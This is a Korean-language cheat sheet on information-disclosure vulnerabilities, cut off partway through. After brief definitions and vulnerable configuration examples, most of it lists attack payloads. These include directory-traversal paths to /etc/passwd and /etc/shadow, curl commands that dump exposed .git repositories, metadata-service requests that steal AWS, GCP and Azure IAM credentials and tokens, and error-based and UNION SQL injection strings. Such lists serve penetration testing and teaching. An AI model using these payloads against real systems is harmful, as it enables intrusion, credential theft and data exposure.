2. [기본 페이로드](#2-기본-페이로드)
3. [특수 페이로드](#3-특수-페이로드)
4. [조치 가이드](#4-조치-가이드)

---

## 1. 정의&원리

### 정보노출(Information Disclosure) 취약점이란?
웹 애플리케이션이 의도하지 않게 민감한 정보를 외부에 노출하는 취약점입니다. 시스템 정보, 소스 코드, 데이터베이스 정보, 사용자 개인정보 등이 적절한 접근 제어 없이 노출될 수 있습니다.

### 정보노출 취약점 유형

#### 1.1. 에러 메시지를 통한 정보 노출 (Error-based Disclosure)
- 데이터베이스 연결 오류 메시지
- 애플리케이션 스택 트레이스
- 시스템 경로 정보 노출

#### 1.2. 백업 파일 노출 (Backup File Exposure)
- 소스 코드 백업 파일
- 데이터베이스 덤프 파일
- 설정 파일 백업

#### 1.3. 디렉토리 리스팅 (Directory Listing)
- 웹 서버 디렉토리 인덱싱
- 파일 구조 노출
- 숨겨진 파일 발견

#### 1.4. 소스 코드 노출 (Source Code Disclosure)
- 버전 관리 시스템 파일 (.git, .svn)
- 설정 파일 (.env, config.php)
- 임시 파일 및 에디터 백업

#### 1.5. 메타데이터 노출 (Metadata Exposure)
- HTTP 헤더 정보 과다 노출
- API 문서 및 스키마 노출
- 클라우드 서비스 메타데이터

### 정보노출 위험도

#### 높은 위험도:
- 데이터베이스 크리덴셜
- API 키 및 시크릿
- 암호화 키
- 사용자 개인정보

#### 중간 위험도:
- 시스템 구조 정보
- 소프트웨어 버전 정보
- 내부 네트워크 구조
- 비즈니스 로직

#### 낮은 위험도:
- 일반적인 에러 메시지
- 공개된 기술 스택 정보
- 기본 시스템 정보

### 일반적인 취약한 설정 예시

#### 취약한 에러 처리 (PHP):
```php
// 상세한 에러 정보가 그대로 노출
try {
    $pdo = new PDO("mysql:host=internal-db;dbname=users", $username, $password);
} catch (PDOException $e) {
    echo "Database connection failed: " . $e->getMessage();
    // 출력 예시: Database connection failed: SQLSTATE[28000] [1045] 
    // Access denied for user 'root'@'192.168.1.100' (using password: YES)
}
```

#### 취약한 디렉토리 설정 (Apache):
```apache
# 디렉토리 리스팅이 활성화된 설정
<Directory "/var/www/html">
    Options Indexes FollowSymLinks
    AllowOverride All
    Require all granted
</Directory>
```

---

## 2. 기본 페이로드

### 2.1. 백업 파일 및 임시 파일 탐지

#### 2.1.1. 소스 코드 백업 파일
```bash
# PHP 백업 파일
index.php.bak
index.php.backup
index.php.old
index.php~
index.php.orig
config.php.save

# JSP 백업 파일
index.jsp.bak
web.xml.backup
applicationContext.xml.old

# ASP/ASPX 백업 파일
default.asp.bak
web.config.backup
global.asax.old

# 에디터 임시 파일
.index.php.swp
index.php.tmp
#index.php#
```

#### 2.1.2. 설정 파일
```bash
# 웹 애플리케이션 설정
.env
.env.local
.env.production
config.ini
database.conf
app.config
application.properties

# 서버 설정
.htaccess
.htpasswd
web.config
httpd.conf
nginx.conf

# 프레임워크별 설정
composer.json
package.json
requirements.txt
Gemfile
pom.xml
```

#### 2.1.3. 로그 파일
```bash
# 애플리케이션 로그
error.log
access.log
debug.log
application.log
system.log

# 서버 로그
error_log
access_log
/var/log/apache2/error.log
/var/log/nginx/access.log

# 개발 도구 로그
npm-debug.log
composer.log
pip.log
```

### 2.2. 버전 관리 시스템 파일

#### 2.2.1. Git 저장소 파일
```bash
# Git 메타데이터
.git/
.git/config
.git/HEAD
.git/logs/HEAD
.git/refs/heads/master

# Git 객체 파일
.git/objects/
.git/index
.git/packed-refs

# Git 설정 및 훅
.git/hooks/
.gitignore
.gitmodules
```

#### 2.2.2. SVN 저장소 파일
```bash
# SVN 메타데이터
.svn/
.svn/entries
.svn/wc.db
.svn/pristine/

# SVN 설정
.svn/all-wcprops
.svn/dir-prop-base
```

#### 2.2.3. 기타 VCS 파일
```bash
# Mercurial
.hg/
.hgignore
.hg/hgrc

# Bazaar
.bzr/
.bzrignore

# CVS
CVS/
CVS/Entries
CVS/Root
```

### 2.3. 개발 도구 파일

#### 2.3.1. IDE 및 에디터 파일
```bash
# IntelliJ IDEA
.idea/
.iml

# Eclipse
.project
.classpath
.settings/

# Visual Studio Code
.vscode/
.vscode/settings.json
.vscode/launch.json

# Sublime Text
*.sublime-project
*.sublime-workspace

# Vim
.vimrc
.*.swp
```

#### 2.3.2. 빌드 도구 파일
```bash
# Maven
pom.xml
target/
.m2/

# Gradle
build.gradle
gradle.properties
.gradle/

# NPM
package.json
package-lock.json
node_modules/

# Composer
composer.json
composer.lock
vendor/
```

### 2.4. 클라우드 및 컨테이너 설정 파일

#### 2.4.1. Docker 관련 파일
```bash
# Docker 설정
Dockerfile
docker-compose.yml
docker-compose.override.yml
.dockerignore

# Kubernetes 설정
deployment.yaml
service.yaml
configmap.yaml
secret.yaml
```

#### 2.4.2. 클라우드 설정 파일
```bash
# AWS
.aws/config
.aws/credentials
cloudformation.yaml
serverless.yml

# Google Cloud
.gcloud/
gcloud_key.json
deployment-manager.yaml

# Azure
.azure/
azure-pipelines.yml
arm-template.json
```

---

## 3. 특수 페이로드

### 3.1. 디렉토리 트래버설을 통한 정보 수집

#### 3.1.1. 시스템 정보 파일
```bash
# Linux/Unix 시스템 정보
../../../etc/passwd
../../../etc/shadow
../../../etc/hosts
../../../proc/version
../../../proc/cpuinfo
../../../proc/meminfo
../../../proc/net/tcp
../../../proc/net/fib_trie

# 시스템 설정
../../../etc/apache2/apache2.conf
../../../etc/nginx/nginx.conf
../../../etc/ssh/sshd_config
../../../etc/crontab
```

#### 3.1.2. 애플리케이션 설정 파일
```bash
# PHP 설정
../../../etc/php/php.ini
../../../var/www/html/.env
../../../var/www/html/config.php

# Python 설정
../../../app/settings.py
../../../app/.env
../../../requirements.txt

# Java 설정
../../../WEB-INF/web.xml
../../../META-INF/context.xml
../../../application.properties
```

#### 3.1.3. 로그 파일 접근
```bash
# 웹 서버 로그
../../../var/log/apache2/access.log
../../../var/log/nginx/error.log
../../../var/log/httpd/access_log

# 애플리케이션 로그
../../../var/log/application.log
../../../logs/error.log
../../../tmp/debug.log
```

### 3.2. HTTP 메소드 기반 정보 수집

#### 3.2.1. OPTIONS 메소드 악용
```http
OPTIONS /api/users HTTP/1.1
Host: target.com

# 응답에서 허용된 메소드 확인
# Allow: GET, POST, PUT, DELETE, PATCH, OPTIONS
# 추가 헤더 정보 노출 가능
```

#### 3.2.2. HEAD 메소드를 통한 정보 수집
```http
HEAD /sensitive-file.pdf HTTP/1.1
Host: target.com

# 파일 존재 여부 및 메타데이터 확인
# Last-Modified, Content-Length, ETag 등
```

#### 3.2.3. TRACE 메소드 악용
```http
TRACE / HTTP/1.1
Host: target.com
X-Custom-Header: test-value

# 서버가 요청을 그대로 반환하여 내부 정보 노출 가능
```

### 3.3. API 문서 및 스키마 노출

#### 3.3.1. API 문서 엔드포인트
```bash
# Swagger/OpenAPI
/swagger/
/swagger-ui/
/swagger.json
/swagger.yaml
/api-docs
/api/docs
/docs/

# GraphQL
/graphql
/graphiql
/graphql/schema
/api/graphql/introspection

# 기타 API 문서
/api/
/api/v1/
/apidoc/
/documentation/
```

#### 3.3.2. 개발자 도구 엔드포인트
```bash
# 디버그 엔드포인트
/debug
/debug/vars
/debug/pprof/
/_debug
/dev/

# 모니터링 엔드포인트
/health
/status
/metrics
/actuator/
/actuator/health
/actuator/env
/actuator/configprops

# 관리자 인터페이스
/admin/
/phpmyadmin/
/adminer/
/manager/html
```

### 3.4. 버전 관리 시스템 악용

#### 3.4.1. Git 정보 추출
```bash
# Git 설정 확인
curl http://target.com/.git/config

# 브랜치 정보
curl http://target.com/.git/HEAD
curl http://target.com/.git/refs/heads/master

# 커밋 로그
curl http://target.com/.git/logs/HEAD

# 파일 목록 (Git index)
curl http://target.com/.git/index

# 소스 코드 복원 스크립트
#!/bin/bash
# GitHack 도구나 직접 구현
mkdir git_dump
cd git_dump
wget -r -np -nH --cut-dirs=1 http://target.com/.git/
git fsck --full
git checkout -- .
```

#### 3.4.2. SVN 정보 추출
```bash
# SVN 엔트리 파일
curl http://target.com/.svn/entries
curl http://target.com/.svn/wc.db

# SVN 프로퍼티
curl http://target.com/.svn/dir-prop-base
curl http://target.com/.svn/all-wcprops
```

### 3.5. 클라우드 환경 정보 노출

#### 3.5.1. AWS 환경 정보
```bash
# EC2 메타데이터
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# S3 버킷 정보
curl http://target-bucket.s3.amazonaws.com/
curl http://s3.amazonaws.com/target-bucket/

# CloudFormation 스택 정보
aws cloudformation describe-stacks --stack-name target-stack

# Lambda 함수 목록
aws lambda list-functions --region us-east-1
```

#### 3.5.2. Google Cloud 환경 정보
```bash
# 메타데이터 서비스
curl -H "Metadata-Flavor: Google" \
     http://metadata.google.internal/computeMetadata/v1/

# 프로젝트 정보
curl -H "Metadata-Flavor: Google" \
     http://metadata.google.internal/computeMetadata/v1/project/

# 서비스 계정 토큰
curl -H "Metadata-Flavor: Google" \
     http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

#### 3.5.3. Azure 환경 정보
```bash
# 인스턴스 메타데이터
curl -H "Metadata: true" \
     "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# 관리 ID 토큰
curl -H "Metadata: true" \
     "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### 3.6. 데이터베이스 정보 수집

#### 3.6.1. 에러 기반 데이터베이스 정보 수집
```sql
-- MySQL 정보 수집
' AND (SELECT * FROM (SELECT COUNT(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- PostgreSQL 정보
' AND 1=CAST((SELECT version()) AS int)--

-- MSSQL 정보
' AND 1=CONVERT(int,(SELECT @@version))--

-- Oracle 정보
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--
```

#### 3.6.2. 스키마 정보 추출
```sql
-- 테이블 목록
' UNION SELECT table_name,2,3 FROM information_schema.tables--

-- 컬럼 정보
' UNION SELECT column_name,data_type,3 FROM information_schema.columns WHERE table_name='users'--

-- 인덱스 정보
' UNION SELECT index_name,column_name,3 FROM information_schema.statistics WHERE table_name='users'--
```

### 3.7. 로그 파일 분석을 통한 정보 수집

#### 3.7.1. 접근 로그 패턴 분석
```bash
# 자주 접근되는 관리자 페이지 발견
grep -E "(admin|manage|control)" access.log | head -20

# 에러 페이지 패턴 분석
grep " 404 " access.log | awk '{print $7}' | sort | uniq -c | sort -nr

# API 엔드포인트 발견
grep -E "/(api|rest|service)/" access.log | awk '{print $7}' | sort | uniq

# 민감한 파라미터 노출
grep -E "(password|token|key|secret)" access.log
```

#### 3.7.2. 에러 로그 분석
```bash
# 데이터베이스 연결 오류
grep -i "database\|mysql\|postgresql\|oracle" error.log

# 파일 시스템 오류
grep -i "permission denied\|no such file" error.log

# 설정 오류
grep -i "config\|configuration" error.log

# 메모리 및 리소스
